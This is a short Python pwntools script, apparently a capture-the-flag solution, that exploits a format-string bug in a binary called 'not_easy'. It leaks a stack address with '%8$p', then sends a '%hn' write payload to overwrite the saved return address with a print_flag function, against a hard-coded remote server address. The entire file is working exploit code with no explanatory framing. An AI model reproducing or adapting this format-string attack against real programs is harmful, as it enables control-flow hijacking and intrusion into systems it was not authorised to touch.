from pwn import *
from sys import *

# 080AE008
print_flag = 0x08049B88
cmd = """
b *0x08049BF8
b *0x0804A0FE
"""
p = process('./not_easy')
p = connect("13.233.66.116", 6969)
if(len(argv) == 3):
	gdb.attach(p, cmd)

p.sendline("%8$p")
p.recvuntil("""The password isn't:

""")
alamat = p.recvline().strip()
alamat = eval(alamat)
eip = alamat - 192
print alamat - 192


# pay  = fmtstr_payload(0, {eip: print_flag}, write_size='short')
pay = p32(eip)
pay += "%39812x"
pay += "%1$hn"
print repr(pay)
p.sendline(pay)
p.interactive()
